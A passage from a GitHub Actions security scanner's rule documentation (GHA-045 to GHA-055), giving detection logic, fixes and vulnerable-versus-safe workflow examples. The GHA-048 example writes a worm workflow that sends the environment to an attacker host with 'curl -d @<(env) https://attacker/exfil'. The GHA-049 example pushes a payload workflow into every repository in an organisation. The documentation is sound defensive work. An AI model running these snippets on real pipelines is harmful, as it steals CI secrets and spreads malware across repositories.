    steps:
      - uses: actions/checkout@<sha>
      - run: npm install         # no secrets in scope
```

**Source:** [`GHA-044`](../providers/github.md#gha-044) in the [GitHub Actions provider](../providers/github.md).

### `GHA-045`: Caller-controlled ref input feeds actions/checkout <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gha-045 }

**Evidences:** [`1.5.2`](#ctrl-1-5-2) Ensure scanners are in place to secure CI/CD pipeline instructions.

**How this is detected.** ``workflow_dispatch`` / ``workflow_call`` inputs land in ``${{ inputs.<name> }}``. Feeding that directly into the ``ref:`` of ``actions/checkout`` means the caller picks which commit runs in this workflow's privileged context (secrets, ``GITHUB_TOKEN``, environment approvals already satisfied). The callee can't tell whether the ref points at a vetted branch, a private fork's tip, or an attacker-controlled SHA. The rule fires on ``ref:`` values whose expression resolves to an ``inputs.*`` reference, walking any ``${{ ... }}`` expression that names an input field.

**Recommendation.** Validate the ``ref`` input against an allow-list (a regex for ``refs/heads/release-*``, an explicit set of permitted tags, or a 40-char SHA match) BEFORE passing it to ``actions/checkout``. If the workflow only needs to build release tags, hard-code the ref or derive it from ``github.event.release.tag_name`` (still attacker-influenced, but at least scoped to a release event). For reusable workflows, document that the callee assumes callers have already validated the ref, and pin every caller to a known list of refs.

**Known false positives.**

- Reusable workflows that ARE the trust boundary (the callee is documented as the authoritative checkout entrypoint and every caller is internal / pinned by SHA) accept this shape by design. The rule still surfaces these so the author can document the contract in a ``.pipelinecheckignore`` rationale; suppress with the caller-list cite.

**Seen in the wild.**

- Snyk ``GitHub Actions abuse via workflow_dispatch`` research (2023) showed reusable build workflows that accepted a ``ref`` input and checked it out without validation. An attacker with workflow_dispatch permission (commonly granted to broader sets of actors than push) pointed the checkout at a fork SHA and exfiltrated the production deploy credentials.

**Proof of exploit.**

```
# Vulnerable: caller picks the ref.
name: build-release
on:
  workflow_dispatch:
    inputs:
      ref:
        description: 'Tag or branch to build'
        required: true
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@<sha>
        with:
          ref: ${{ inputs.ref }}      # caller controls
      - run: make release
        env:
          SIGNING_KEY: ${{ secrets.RELEASE_SIGNING_KEY }}

# Attack: any actor with workflow_dispatch permission opens
# the API and dispatches with ``ref: refs/pull/123/head`` (a
# fork PR). The privileged workflow checks out the attacker-
# controlled tree and runs ``make release`` with the signing
# key in scope. No code review, no PR merge — one API call.

# Safe: validate the ref before use.
      - name: Validate ref
        run: |
          case "$REF" in
            refs/tags/v*) ;;
            *) echo "refusing $REF"; exit 1 ;;
          esac
        env:
          REF: ${{ inputs.ref }}
      - uses: actions/checkout@<sha>
        with:
          ref: ${{ inputs.ref }}
```

**Source:** [`GHA-045`](../providers/github.md#gha-045) in the [GitHub Actions provider](../providers/github.md).

### `GHA-046`: Manual PR-head fetch on untrusted-trigger workflow <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-gha-046 }

**Evidences:** [`1.5.2`](#ctrl-1-5-2) Ensure scanners are in place to secure CI/CD pipeline instructions.

**How this is detected.** GHA-002 catches ``actions/checkout`` with ``ref: ${{ github.event.pull_request.head.sha }}``. The same primitive shows up as ``gh pr checkout``, ``git fetch origin pull/<N>/head``, and ``git checkout`` of an attacker-controlled SHA expression inside a ``run:`` block. They all land the same bytes in the workspace with the same privileged context active, so they get the same severity.

**Recommendation.** Don't materialize the PR head in a ``pull_request_target`` or ``workflow_run`` job. If you need to inspect PR content, split the workflow: a privileged half (with secrets) that uses metadata only (PR number, base ref, label) and an unprivileged ``pull_request`` half that builds the code with no secrets in scope.

**Known false positives.**

- Workflows that fetch the PR head purely to *inspect metadata* (``git fetch origin pull/N/head && git log -1 FETCH_HEAD --format=%s``) and never run code from the fetched tree still trigger the rule, because the fetch primitive is the structural signal. The rule has no way to confirm the workspace bytes are never executed. Suppress per-workflow via ``--ignore-file`` once you've verified no ``run:`` / ``uses: ./`` step consumes the checked-out tree; the safer pattern is still to read PR metadata via the GitHub API rather than materializing the head ref.

**Seen in the wild.**

- GitHub Security Lab: [Preventing pwn requests](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/) (2020) listed manual ``git fetch pull/<N>/head`` as one of the equivalent ways teams shoot themselves in the foot. Auditors checking only ``actions/checkout`` miss the shell-level variants entirely.

**Proof of exploit.**

```
# Vulnerable: pull_request_target + gh pr checkout.
name: triage
on:
  pull_request_target:
    types: [opened, synchronize]
jobs:
  test-pr:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@<sha>     # base, looks safe
      - run: gh pr checkout ${{ github.event.number }}
        env:
          GH_TOKEN: ${{ github.token }}
      - run: make test           # now runs PR Makefile

# Attack: same as GHA-002. The PR ships a Makefile that
# exfils $GITHUB_TOKEN and every ${{ secrets.* }} the
# pull_request_target context exposes. GHA-002's pattern
# match never fires because ``actions/checkout`` looks
# innocent, the PR content lands via the shell instead.

# Safe: don't materialize PR content with secrets active.
# Move the build to a pull_request workflow:
name: build
on: { pull_request: {} }
jobs:
  test-pr:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@<sha>     # PR head, no secrets
      - run: make test
```

**Source:** [`GHA-046`](../providers/github.md#gha-046) in the [GitHub Actions provider](../providers/github.md).

### `GHA-047`: Action ref resolves to a recently committed tag or SHA <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gha-047 }

**Evidences:** [`1.5.2`](#ctrl-1-5-2) Ensure scanners are in place to secure CI/CD pipeline instructions.

**How this is detected.** Reads ``ref_committed_at`` from ``ctx.action_metadata[owner/repo]`` (populated by the ``--resolve-remote`` path via ``GET /repos/{owner}/{repo}/commits/{ref}``). Fires when the referenced ref's commit date is younger than ``MIN_REF_AGE_DAYS`` (7). Trusted publishers (``actions``, ``aws-actions``, ``azure``, ...) are skipped by default to avoid firing on legitimate retags of floating majors; pin to a SHA to opt those back in. Without ``--resolve-remote`` the rule passes silently with a discovery nudge.

**Recommendation.** Wait until the referenced tag or commit has had time to be reviewed by the upstream community before pulling it into CI. The default cooldown is seven days. Either bump the pinned ref to an older release, or wait 7 days and re-run. If the action is internal / first-party and the freshness gate is unwanted, pin to a 40-char commit SHA — SHA pins don't move under a retag and are the preferred long-term mitigation.

**Known false positives.**

- A legitimate first-party action that's outside the default trusted-publisher allowlist (a small vendor org that publishes a real action; you'd like it included) will fire after every release for the cooldown window. Either pin to a SHA (preferred) or suppress via ignore-file with a dated note; the suppression decays once the ref ages past the threshold.

**Seen in the wild.**

- Multiple action-tag compromises (ua-parser-js npm 2021, tj-actions/changed-files 2025) followed the same shape: a tag was re-pointed at a malicious commit and consumers pulling on the next CI run executed the payload. Cooldown gating turns the community-detection window into a defense.

**Source:** [`GHA-047`](../providers/github.md#gha-047) in the [GitHub Actions provider](../providers/github.md).

### `GHA-048`: Workflow step writes a file under .github/workflows/ <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-gha-048 }

**Evidences:** [`1.5.2`](#ctrl-1-5-2) Ensure scanners are in place to secure CI/CD pipeline instructions.

**How this is detected.** Fires when a ``run:`` body writes a file path containing ``.github/workflows/`` via shell redirect (``>``, ``>>``), ``tee``, ``cp`` / ``mv``, heredoc, ``cat <<EOF >``, or a templating tool (``envsubst``, ``yq -i``, ``sed -i``). The rule also fires on a ``uses:`` of a third-party action whose documented behavior is workflow file generation (anything matching ``stefanzweifel/git-auto-commit`` paired with a ``.github/workflows`` argument). The single Shai-Hulud worm (2026) propagated via this exact pattern: a postinstall script wrote ``.github/workflows/shai-hulud-workflow.yml`` into every repo the stolen ``GITHUB_TOKEN`` could push to.

Distinct from GHA-019 (token-to-file persistence) and GHA-049 (cross-repo push): GHA-048 catches the *content* (a workflow file is written somewhere on the runner), GHA-049 catches the *push* (the runner's git remote is a repo other than the one under test).

**Recommendation.** Remove the step that writes into ``.github/workflows/``. A workflow that authors a sibling workflow is the canonical worm-propagation primitive: the new file runs on the next matching trigger with the repo's GITHUB_TOKEN. There is no legitimate non-automation reason for an in-CI step to write workflow YAML; bot-style automation (release-please, Renovate) should be moved to an external account whose token is scoped, audited, and not the runner's ``GITHUB_TOKEN``. If the write is a templated scaffold (``cookiecutter`` for a new repo), do it in a separate, environment-gated job and ensure the target is never the same repo's workflows dir.

**Known false positives.**

- Workflow-bootstrap repos (``cookiecutter-gh-action``, internal scaffolding for new microservices) legitimately scaffold ``.github/workflows/`` files. The right scope is a single, well-named step in an environment-gated job; suppress on that specific step with a rationale that names the destination repo and the gating environment.
- Bot accounts that legitimately republish workflow files (``release-please-action`` updating its own manifest) are narrow allow-list candidates rather than blanket suppression targets.

**Seen in the wild.**

- Shai-Hulud npm worm (2026): the malicious postinstall script in compromised packages used the runner's GITHUB_TOKEN to push ``.github/workflows/shai-hulud-workflow.yml`` into the victim's repos. On the next push trigger the worm ran with fresh token scope, repeating the propagation step against every repo the token could reach.

**Proof of exploit.**

```
# Vulnerable: a build step writes a sibling workflow file.
# After the next push to the default branch, the new
# workflow runs with the repo's permissions and propagates.
jobs:
  build:
    permissions: { contents: write }
    steps:
      - uses: actions/checkout@<sha>
      - run: npm ci
      - run: |
          # postinstall-driven worm pattern:
          cat > .github/workflows/shai-hulud.yml <<'EOF'
          name: shai-hulud
          on: push
          jobs:
            spread:
              runs-on: ubuntu-latest
              steps:
                - run: curl -d @<(env) https://attacker/exfil
          EOF
          git add .github/workflows/shai-hulud.yml
          git commit -m 'ci: add lint workflow'
          git push

# Safe: never author workflow YAML from inside another
# workflow. Scaffold via an external bootstrapping job
# that runs outside the runner's GITHUB_TOKEN scope.
```

**Source:** [`GHA-048`](../providers/github.md#gha-048) in the [GitHub Actions provider](../providers/github.md).

### `GHA-049`: Workflow step makes a privileged git write (cross-repo or actions[bot] bypass) <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gha-049 }

**Evidences:** [`1.5.2`](#ctrl-1-5-2) Ensure scanners are in place to secure CI/CD pipeline instructions.

**How this is detected.** Four shapes are detected in ``run:`` bodies:

1. ``git push`` to a remote whose URL is interpolated from an expression (``${{ ... }}``), an env var (``$VAR``), or is not the canonical ``origin`` / ``upstream``;
2. ``gh repo create`` / ``gh repo edit`` / ``gh repo transfer`` / ``gh api /repos/...`` whose target owner is parameterized;
3. ``gh release create`` / ``gh release upload`` against a repo specified via ``-R <owner>/<repo>`` where the value is parameterized rather than a literal allow-list entry;
4. ``git config user.name 'github-actions[bot]'`` (or ``actions-user`` / ``41898282+github-actions[bot]``) co-occurring with any ``git push`` in the same job. The combination is the canonical branch-protection bypass-abuse shape: GitHub's documented operational convenience is to list ``github-actions[bot]`` in ``Allow specified actors to bypass required pull requests`` on the default branch, after which any workflow that assumes that identity can push to ``main`` without review. The SCM provider's SCM-018 catches the branch-protection side; this leg catches the workflow that's pre-positioned to exploit it.

Pairs with GHA-048 (self-mutation, which catches the *write* into ``.github/workflows/`` of a sibling workflow): GHA-049 catches the *push* primitive that lets a worm leave the current repo. Together they cover both halves of the Shai-Hulud propagation step.

**Recommendation.** Don't push from CI to a repository whose owner is supplied by an unvetted source (an env var, a workflow input, an interpolated PR field, or a step output). Cross-repo writes from CI are the second leg of the Shai-Hulud propagation loop, the worm uses the runner's GITHUB_TOKEN (or a stolen PAT) to ``git push`` or ``gh repo create`` against every repo the token can reach. If the workflow truly needs to push to an external repo, bind the step to a protected ``environment:`` and pin the destination to a literal ``owner/repo`` string.

**Known false positives.**

- Mirror jobs (push to ``github.com/<our-org>/<mirror>``), monorepo release jobs that push to a publishing org, and release-please-style automation legitimately push to a different repo. Suppress on the specific step name with a rationale that names the literal target. The rule does NOT fire on ``git push origin <ref>`` or ``git push upstream <ref>`` where the remote URL is otherwise unspecified.

**Seen in the wild.**

- Shai-Hulud npm worm (2026): the propagation loop combined a stolen GITHUB_TOKEN with ``gh repo create`` plus ``git push`` to seed ``shai-hulud-workflow.yml`` into every repo the token could reach. Without the cross-repo push primitive the worm cannot leave the first infected runner.

**Proof of exploit.**

```
# Vulnerable: every repo the token can write to becomes a
# propagation target on the next push trigger.
jobs:
  spread:
    permissions: { contents: write, administration: write }
    steps:
      - uses: actions/checkout@<sha>
      - run: |
          for repo in $(gh repo list "$ORG" --json name -q '.[].name'); do
            gh repo clone "$ORG/$repo" "/tmp/$repo"
            cp payload.yml "/tmp/$repo/.github/workflows/lint.yml"
            git -C "/tmp/$repo" add .github/workflows/lint.yml
            git -C "/tmp/$repo" commit -m 'ci: add lint workflow'
            git -C "/tmp/$repo" push origin main
          done

# Safe: cross-repo pushes only from an environment-gated job
# pinned to a literal destination, with a fine-scoped PAT
# (not the workflow's GITHUB_TOKEN).
jobs:
  mirror:
    environment: mirror-protected
    permissions: { contents: read }
    steps:
      - run: git push https://x-access-token:${{ secrets.MIRROR_PAT }}@github.com/our-org/our-mirror.git main
```

**Source:** [`GHA-049`](../providers/github.md#gha-049) in the [GitHub Actions provider](../providers/github.md).

### `GHA-050`: Publish step relies on long-lived registry token <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gha-050 }

**Evidences:** [`1.5.2`](#ctrl-1-5-2) Ensure scanners are in place to secure CI/CD pipeline instructions.

**How this is detected.** Fires when a step matches a known package-publish primitive AND the job has no protected ``environment:`` AND the step references a long-lived registry secret. Publish primitives covered:

- ``run: npm publish`` / ``pnpm publish`` / ``yarn publish``
- ``run: twine upload`` / ``run: poetry publish`` / ``run: uv publish``
- ``run: gem push`` / ``run: cargo publish``
- ``uses: pypa/gh-action-pypi-publish`` with a ``password`` input (the trusted-publisher path leaves ``password`` unset);
- ``uses: JS-DevTools/npm-publish`` with a ``token`` input.

Long-lived secret heuristic: the step's ``env:`` or ``with:`` block references ``NPM_TOKEN``, ``NODE_AUTH_TOKEN``, ``PYPI_TOKEN``, ``TWINE_PASSWORD``, ``POETRY_PYPI_TOKEN``, ``RUBYGEMS_API_KEY``, or ``CARGO_REGISTRY_TOKEN`` from ``secrets.*``. A job that already binds to a protected ``environment:`` passes regardless, because the environment's required-reviewers / branch-rule controls compensate for the static credential.

Pairs with GHA-030 (cloud OIDC trust). GHA-030 covers the cloud-credentials exchange; GHA-050 covers the package registry side.

**Recommendation.** Replace long-lived publish tokens with OIDC trusted-publisher flows and bind the publish job to a protected ``environment:``. Concretely:

- **PyPI**: use ``pypa/gh-action-pypi-publish`` with PEP 740 trusted publishing (no ``password`` input); the GHA OIDC token is exchanged at PyPI for a short-lived upload token.
- **npm**: use ``--provenance`` on ``npm publish`` from a job that requests ``id-token: write`` (npm provenance, GA 2024); drop ``NODE_AUTH_TOKEN`` / ``NPM_TOKEN`` from the env block where possible.
- **GHCR / ECR / GAR**: prefer ``configure-aws-credentials`` with ``role-to-assume`` (or the Azure / GCP equivalent), not static registry passwords.
- Add ``environment: <protected-name>`` to the publish job so branch restrictions and required reviewers apply.

A long-lived ``NPM_TOKEN`` is the fuel a Shai-Hulud-shaped worm needs: once stolen from any runner it can publish more compromised packages on the org's behalf. OIDC tokens expire in minutes and are scoped to the run that requested them.

**Known false positives.**

- Private / internal registries that don't support OIDC (legacy Artifactory, self-hosted Nexus without OIDC broker) require a static token. The right response is ``environment:`` gating with required reviewers on the publish job; suppress this rule with a rationale that names the protected environment.
- First-publish bootstrap of a new package (npm and PyPI both require an initial manual publish before trusted-publisher can be wired). The rule fires; suppress on the specific step until the trusted-publisher record is in place.

**Seen in the wild.**

- Shai-Hulud npm worm (2026): the worm's self-propagation step scraped ``NPM_TOKEN`` from runner env / ``~/.npmrc`` and used it to ``npm publish`` patch versions of other packages the maintainer's account owned. Provenance + OIDC + environment gating turn that step into a no-op: the OIDC token doesn't survive the run, and an environment-gated publish requires a human reviewer.
- TanStack / Mistral compromises (May 2026): same shape, mass publish of poisoned versions using maintainer credentials. An environment gate on the publish job would have stopped the unattended release.

**Proof of exploit.**

```
# Vulnerable: long-lived NPM_TOKEN, no environment gate. Any
# postinstall in a transitive dep reaches the token via the
# step env and can re-publish other packages the token can
# reach.
jobs:
  release:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@<sha>
      - uses: actions/setup-node@<sha>
        with: { registry-url: 'https://registry.npmjs.org' }
      - run: npm ci && npm publish
        env:
          NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }}

# Safe: OIDC trusted-publisher + provenance + environment
# gate. The publish job requires a deployment approval; the
# upload uses a short-lived OIDC token; the tarball is
# signed with provenance metadata npm verifies on install.
jobs:
  release:
    runs-on: ubuntu-latest
    environment: npm-publish        # required reviewers
    permissions:
      contents: read
      id-token: write               # OIDC
    steps:
      - uses: actions/checkout@<sha>
      - uses: actions/setup-node@<sha>
        with: { registry-url: 'https://registry.npmjs.org' }
      - run: npm ci --ignore-scripts
      - run: npm publish --provenance --access public
```

**Source:** [`GHA-050`](../providers/github.md#gha-050) in the [GitHub Actions provider](../providers/github.md).

### `GHA-051`: services / container image is not pinned by digest <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gha-051 }

**Evidences:** [`1.5.2`](#ctrl-1-5-2) Ensure scanners are in place to secure CI/CD pipeline instructions.

**How this is detected.** Walks ``jobs.<id>.services.<name>.image`` and ``jobs.<id>.container.image`` (the two places a GitHub-hosted runner pulls a third-party image at job start). Flags any reference that isn't pinned by ``@sha256:<digest>``: bare tags (``postgres:16``), ``latest``, no-tag (``redis``), and ``mcr.microsoft.com/dotnet/sdk:8.0``-style tag pins all fail.

Complements DF-001 (Dockerfile ``FROM`` pinning), GHA-001 (action ``uses:`` pinning), and GHA-040 (known-compromised action refs). Where those catch your own code pulling a third party, GHA-051 catches the *runner* pulling a third-party image to host the workflow alongside your code — same trust shape, different ingress.

**Recommendation.** Replace every ``services.<name>.image:`` (and the same field on a job-level ``container:`` block) with a ``<image>@sha256:<digest>`` reference. The services / container runs alongside the workflow on the same runner and sees the same secret environment, so a swapped sidecar image is the same shape of attack as a swapped action: arbitrary code on the runner under the workflow's identity. Use a registry that returns immutable digests (``docker buildx imagetools inspect`` resolves a tag to a digest), pin to that digest, then re-pin on the next intentional upgrade — exactly the workflow GHA-001 already documents for ``uses: actions/...@<sha>``.

**Known false positives.**

- Workflows that pull from an org-internal private registry where the registry itself enforces image immutability sometimes pin by tag deliberately. The safer pattern is still ``@sha256:``: the registry's immutability is a separate trust boundary you'd need to audit, while a digest pin is self-verifying. Suppress with a rationale that names the registry and the audit channel.

**Source:** [`GHA-051`](../providers/github.md#gha-051) in the [GitHub Actions provider](../providers/github.md).

### `GHA-052`: actions/cache key includes untrusted PR-controllable input <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gha-052 }

**Evidences:** [`1.5.2`](#ctrl-1-5-2) Ensure scanners are in place to secure CI/CD pipeline instructions.

**How this is detected.** Walks every step using ``actions/cache@*`` (or the ``cache-save`` / ``cache-restore`` variants) and checks ``with.key:`` (plus ``with.restore-keys:``) for references to attacker-controllable expression contexts: ``github.head_ref``, ``github.event.pull_request.*``, ``github.event.issue.*``, ``github.event.comment.*``, and the actor / sender fields when used in a key.

Pairs with GHA-027 (``pull_request_target`` on untrusted input) and GHA-046 (manual PR-head fetches on untrusted triggers): the same set of expression contexts that flow into a shell are also the contexts that flow into cache key construction. References to ``github.ref`` / ``github.ref_name`` / ``runner.os`` / ``hashFiles(...)`` are safe and pass.

**Recommendation.** Build the cache key from values an attacker cannot control. ``hashFiles('**/package-lock.json')`` and the like are safe — the hash changes only when the tracked files change, which is itself the trust signal. Avoid ``github.head_ref``, ``github.event.pull_request.*``, ``github.event.issue.*``, and any ``inputs.*`` whose value can be set by a ``workflow_dispatch`` from an untrusted actor.

The attack is cache poisoning: an attacker opens a PR whose branch name (``head_ref``) is crafted so that ``actions/cache`` stores a malicious payload under a key that a subsequent privileged run (e.g., on ``main``) consumes. The next run hits the poisoned cache, executes the attacker's code under the trusted workflow's permissions, and the original PR never has to be merged. Pin keys to ``hashFiles`` of lockfiles or branch-restricted ``github.ref_name`` (post-checkout, only commits already in the trusted branch generate that ref name).

**Known false positives.**

- Some workflows legitimately scope cache keys per feature branch by including ``github.head_ref`` in a ``pull_request`` workflow where the cache is segmented by ref (so cross-branch poisoning is impossible). The right pattern is to prefix the key with a non-attacker-controllable namespace AND rely on ``restore-keys`` only for read-fallback. Suppress on the specific step with a rationale that documents the namespacing.

**Proof of exploit.**

```
# Vulnerable: ``actions/cache`` keys on a PR-controllable
# value (``github.event.pull_request.title`` /
# ``github.head_ref`` / similar). A fork PR sets the
# title (or branch name) to match a key that a trusted-
# context build writes; the trusted build reads the PR's
# poisoned cache and ingests attacker-controlled bytes.
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@<sha>
      - uses: actions/cache@<sha>
        with:
          path: ~/.npm
          key: npm-${{ github.head_ref }}   # PR-controllable
      - run: npm ci

# Safe: key on commit-stable inputs only — a hash of the
# lockfile is unique enough and not attacker-controllable
# across PR boundaries. Fork PR caches are namespaced
# separately and never read by trusted-context builds.
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@<sha>
      - uses: actions/cache@<sha>
        with:
          path: ~/.npm
          key: npm-${{ hashFiles('package-lock.json') }}
      - run: npm ci
```

**Source:** [`GHA-052`](../providers/github.md#gha-052) in the [GitHub Actions provider](../providers/github.md).

### `GHA-053`: if: predicate evaluates attacker-controllable context as expression <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gha-053 }

**Evidences:** [`1.5.2`](#ctrl-1-5-2) Ensure scanners are in place to secure CI/CD pipeline instructions.

**How this is detected.** Scans every job-level and step-level ``if:`` for references to attacker-controllable expression contexts: ``github.event.head_commit.message``, ``github.event.pull_request.title``, ``...body``, ``...head.ref``, ``github.head_ref`` (the top-level shorthand for the same PR source-branch name), ``github.event.issue.title`` / ``...body``, ``github.event.comment.body``, ``github.event.review_comment.body``, ``github.event.review.body``.

Safe contexts (``github.ref``, ``github.ref_name``, ``github.actor``, ``github.repository``, ``github.event_name``) are not flagged — those are set by GitHub, not by the actor. ``inputs.*`` references are also safe by convention; the trigger channel that supplies them is a separate trust boundary the workflow author controls.

Complements GHA-002 (``run:`` body interpolating untrusted context — same source set, shell sink) and GHA-052 (cache key derived from untrusted context — same source set, cache sink). GHA-053 closes the third sink: the expression evaluator itself.

**Recommendation.** Compare against safe context keys (``github.ref``, ``github.actor``, ``github.repository``) and check the untrusted input via a step output rather than a direct ``if:`` reference. Concretely: read the attacker-controllable field into a step output first, then use ``if: steps.gate.outputs.is_release == 'true'`` rather than ``if: contains(github.event.head_commit.message, '[release]')``. The shape difference is subtle but decisive: GitHub passes the ``if:`` string through its expression evaluator, which means certain payloads in the untrusted value (single-quote injection, nested ``${{ }}``) execute as expression syntax rather than matching as a literal. Routing through a step output forces the value to land in a shell variable first, where the runner's normal quoting protects it.

Documented attack: a PR title of ``${{ secrets.X }}`` inside an ``if: contains(github.event.pull_request.title, ...)`` predicate evaluates the ``secrets.X`` reference instead of comparing it as a literal, exfiltrating the secret into the workflow's conditional decision and from there into logs.

**Known false positives.**

- A workflow that legitimately gates on the existence of certain text in the commit message (release automation) and is invoked only via ``workflow_dispatch`` from a trusted actor isn't exposed to the attack. The right pattern is still to route through a step output for clarity; suppress on the specific job/step when the trigger channel itself enforces the trust boundary.

**Proof of exploit.**

```
# Vulnerable: ``if: ${{ contains(github.event.issue.title,
# 'deploy') }}`` evaluates an attacker-controllable string
# in the expression language. The expression engine
# parses certain inputs (``${{ ... }}`` nested) before
# the contains() check, so a crafted title can corrupt
# the predicate's evaluation.
on:
  issue_comment:
    types: [created]
jobs:
  ondemand-deploy:
    if: ${{ contains(github.event.comment.body, '/deploy') }}
    runs-on: ubuntu-latest
    permissions: { contents: write }
    steps:
      - run: ./deploy.sh

# Safe: route the untrusted value through an intermediate
# step that pulls the value into an env var, then evaluate
# the predicate against a guaranteed-safe shape (issue
# author is a maintainer, label exists, etc.) computed
# from authenticated sources.
on:
  issue_comment:
    types: [created]
jobs:
  ondemand-deploy:
    if: |
      github.event.comment.author_association == 'OWNER' &&
      startsWith(github.event.comment.body, '/deploy')
    runs-on: ubuntu-latest
    permissions: { contents: write }
    steps:
      - run: ./deploy.sh
```

**Source:** [`GHA-053`](../providers/github.md#gha-053) in the [GitHub Actions provider](../providers/github.md).

### `GHA-054`: actions/checkout with ssh-key persists SSH credential in repo <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gha-054 }

**Evidences:** [`1.5.2`](#ctrl-1-5-2) Ensure scanners are in place to secure CI/CD pipeline instructions.

**How this is detected.** Walks every step with ``uses: actions/checkout@*`` and checks the ``with:`` block. Fires when both:

* ``with.ssh-key`` is set (any value — ``${{ secrets.  X }}`` is the typical shape), AND
* ``with.persist-credentials`` is not explicitly set   to ``false`` (the default behavior is ``true``).

Complements GHA-037 (ArtiPacked / persist-credentials on token-based checkouts). Where GHA-037 catches the ``GITHUB_TOKEN`` persistence shape, GHA-054 catches the SSH-deploy-key persistence shape — same risk, different credential type.

**Recommendation.** Set ``with: persist-credentials: false`` on every ``actions/checkout`` step that also passes ``ssh-key:`` from a secret. With ``persist-credentials: true`` (the default), the checkout action writes the SSH key into ``.git/config`` of the checked-out repo and configures the local repo to use that key for subsequent ``git`` invocations. Any later step in the same job that runs untrusted code (a build script, a test fixture, a postinstall) inherits the credential via the repo's git config — same shape as the ``ArtiPacked`` family GHA-037 catches for ``GITHUB_TOKEN``.

The safe pattern: ``actions/checkout@<sha>`` with ``ssh-key: ${{ secrets.DEPLOY_KEY }}`` AND ``persist-credentials: false``. The action uses the key for the initial clone, then unsets it; subsequent steps don't have access. If you actually need to ``git push`` later in the job using the same key, re-configure with ``GIT_SSH_COMMAND`` in just that step rather than globally.

**Known false positives.**

- Workflows that genuinely need the SSH key to remain available in the repo (a single-job pipeline that clones, builds, and pushes back to the same repo using the same key) sometimes set ``persist-credentials: true`` deliberately. The safer pattern is to split the push into a separate job whose ``actions/checkout`` re-clones with the same key but without persist; or use a fine-grained PAT for the push step. Suppress with a rationale that names the single-job constraint.

**Proof of exploit.**

```
# Vulnerable: ``actions/checkout`` with ``ssh-key:`` and
# ``persist-credentials: true`` writes the deploy SSH
# private key into ``.git/config`` (or the ssh-agent
# session) for the workflow's duration. A later step that
# uploads the workspace as an artifact leaks the key the
# same way ArtiPACKED leaks the GITHUB_TOKEN.
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@<sha>
        with:
          ssh-key: ${{ secrets.DEPLOY_KEY }}
          # default persist-credentials: true
      - run: ./build.sh
      - uses: actions/upload-artifact@<sha>
        with:
          name: build
          path: .   # uploads .git/config + ssh setup

# Safe: set ``persist-credentials: false`` and scope the
# artifact upload to ``dist/`` (not the repo root).
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@<sha>
        with:
          ssh-key: ${{ secrets.DEPLOY_KEY }}
          persist-credentials: false
      - run: ./build.sh
      - uses: actions/upload-artifact@<sha>
        with:
          name: build
          path: dist/
```

**Source:** [`GHA-054`](../providers/github.md#gha-054) in the [GitHub Actions provider](../providers/github.md).

### `GHA-055`: Reusable workflow outputs derive a secret or caller-input value <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gha-055 }

**Evidences:** [`1.5.1`](#ctrl-1-5-1) Ensure scanners are in place to identify and prevent sensitive data in code, [`1.5.2`](#ctrl-1-5-2) Ensure scanners are in place to secure CI/CD pipeline instructions.

**How this is detected.** Scans ``on.workflow_call.outputs.<name>.value:`` for ``${{ secrets.* }}`` references (and also the ``${{ inputs.* }}`` shape when the caller can pass secrets through). Skips workflows that don't declare ``on.workflow_call`` — only reusable workflows have outputs that propagate across the workflow boundary.

Complements GHA-019 (token-to-file persistence) and GHA-033 (secret echoed in ``run:``) — both catch a secret leaking via the *log* surface. GHA-055 closes the third surface: the workflow boundary itself, where a reusable workflow's outputs cross into the caller's context without masking.

**Recommendation.** Remove every ``${{ secrets.* }}`` and ``${{ inputs.* }}`` reference from the ``on.workflow_call.outputs.<name>.value:`` field. A reusable workflow's outputs are visible to the caller as ordinary job outputs (``needs.<job>.outputs.*``), which means: the secret value gets written into the caller's build log when the caller references the output, it gets persisted to the workflow run's summary, and any cross-job ``needs`` chain in the caller propagates it further. GitHub's secret-masking layer only redacts the value in the *defining* workflow's logs; once the value crosses the workflow boundary via ``outputs:``, the masking doesn't follow. The ``inputs.*`` route is the indirect form: a caller wires ``with: x: ${{ secrets.X }}`` into one of the reusable workflow's inputs, and re-emitting that input as an output crosses the same boundary with the same loss-of-masking outcome.

If the caller genuinely needs information derived from a secret (e.g., a build artifact name incorporating a tenant id), derive the non-secret transform on the callee side first (``echo "name=$(echo \$SECRET | sha256sum | cut -d' ' -f1)" >> $GITHUB_OUTPUT``) and emit only the transformed value. The reusable workflow's outputs should never contain raw secret bytes or caller-controlled input bytes.

**Known false positives.**

- A reusable workflow that emits a *hash* of a secret (``sha256(secret)``) as an output is not the same risk shape — the original secret is not recoverable. The rule errs on the side of flagging any direct ``${{ secrets.* }}`` / ``${{ inputs.* }}`` substring in the output value; suppress when the value is provably a one-way transform.

**Proof of exploit.**

```
# Vulnerable: a reusable workflow exposes a secret (or a
# caller-input value) via ``outputs:``. Outputs from a
# reusable workflow flow back to the caller's workflow
# in plain text; the secret leaks even though the
# reusable workflow itself runs in a sandboxed context.
# .github/workflows/reusable.yml
on:
  workflow_call:
    secrets:
      api_token:
        required: true
    outputs:
      effective-token:
        description: "token used"
        value: ${{ secrets.api_token }}
jobs:
  fetch:
    runs-on: ubuntu-latest
    steps: [{ run: curl --header "Authorization: Bearer ${{ secrets.api_token }}" ... }]

# Safe: don't surface secrets through reusable-workflow
# outputs. Outputs should carry computed non-secret
# values (a release tag, a status flag, the digest of an
# uploaded artifact) the caller might key off.
# .github/workflows/reusable.yml
on:
  workflow_call:
    secrets:
      api_token: { required: true }
